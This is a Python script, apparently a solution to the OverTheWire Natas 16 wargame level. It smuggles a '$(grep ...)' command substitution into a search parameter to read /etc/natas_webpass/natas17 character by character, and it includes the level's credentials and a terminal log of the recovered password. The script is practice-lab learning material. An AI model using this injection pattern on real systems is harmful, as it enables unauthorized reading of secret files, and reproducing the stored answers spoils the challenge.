import requests
from requests.auth import HTTPBasicAuth
#this script is a guessing the password by using the brute-force-attack processing. It will be using HTTP-request and using "grep" command for guess the password and search the right and match password.

# natas username;password as authentication for server 
username = 'natas16'
password = 'hPkjKYviLQctEW33QmuXL6eDVfMW4sGo'

characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'

# for loop do the guesting the password - which means this script try to find "natas17" password for the path "/etc/natas_webpass/natas17". 
# the password might be 32 characters and it will try guess one character at a time 
out = ""
for i in range(0, 32):
    for j in characters:

      # here "command" means, use a "grep" for checking the password specific characters and try to guess one character at a time and each time to it will send to the server "payload" modes.
        command = f"^$(grep -o ^{out+j} /etc/natas_webpass/natas17)A"
        payload = {'needle': command, 'submit': 'search'}
        result = requests.get('http://natas16.natas.labs.overthewire.org/', auth=HTTPBasicAuth(username, password), params=payload)
        str1 = result.text
        # print(str1)
        start = str1.find('<pre>\n') + len('<pre>\n')
        end = str1.find('</pre>')
        str2 = [x for x in str1[start:end].split('\n')]
        if str2[0] != "African": #African - this word is in the list of the dictionary.txt
            out += j
            print(out)
            break
print(out)


'''
┌──(kali㉿kali)-[~/Desktop]
└─$ python3 pythonkoodi.py 
E
Eq
Eqj
EqjH
EqjHJ
EqjHJb
EqjHJbo
EqjHJbo7
EqjHJbo7L
EqjHJbo7LF
EqjHJbo7LFN
EqjHJbo7LFNb
EqjHJbo7LFNb8
EqjHJbo7LFNb8v
EqjHJbo7LFNb8vw
EqjHJbo7LFNb8vwh
EqjHJbo7LFNb8vwhH
EqjHJbo7LFNb8vwhHb
EqjHJbo7LFNb8vwhHb9
EqjHJbo7LFNb8vwhHb9s
EqjHJbo7LFNb8vwhHb9s7
EqjHJbo7LFNb8vwhHb9s75
EqjHJbo7LFNb8vwhHb9s75h
EqjHJbo7LFNb8vwhHb9s75ho                                                                                            
EqjHJbo7LFNb8vwhHb9s75hok                                                                                           
EqjHJbo7LFNb8vwhHb9s75hokh                                                                                          
EqjHJbo7LFNb8vwhHb9s75hokh5                                                                                         
EqjHJbo7LFNb8vwhHb9s75hokh5T                                                                                        
EqjHJbo7LFNb8vwhHb9s75hokh5TF                                                                                       
EqjHJbo7LFNb8vwhHb9s75hokh5TF0
EqjHJbo7LFNb8vwhHb9s75hokh5TF0O
EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC
EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC
'''
